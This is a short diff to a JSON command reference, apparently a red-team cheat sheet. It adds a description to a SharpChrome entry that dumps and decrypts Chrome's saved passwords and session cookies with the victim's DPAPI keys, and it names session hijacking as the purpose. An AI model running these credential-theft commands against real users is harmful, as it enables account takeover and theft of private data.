@@ -195,7 +195,8 @@
   "variations": [
     {
       "label": "Cookies too",
-      "command": ".\\SharpChrome.exe cookies /unprotect"
+      "command": ".\\SharpChrome.exe cookies /unprotect",
+      "description": "Extracts saved passwords, cookies, and browsing data from Google Chrome. Decrypts Chrome's credential store using DPAPI keys from the current user context."
     }
   ],
   "explain": "Decrypts saved Chrome passwords using the current user's DPAPI keys:\n  .\\SharpChrome.exe logins   read Chrome's Login Data and decrypt it\n  /unprotect               use the logged-on user's DPAPI master key to reveal plaintext site passwords\nRun in the victim's context. cookies /unprotect grabs session cookies too (for session hijacking)."
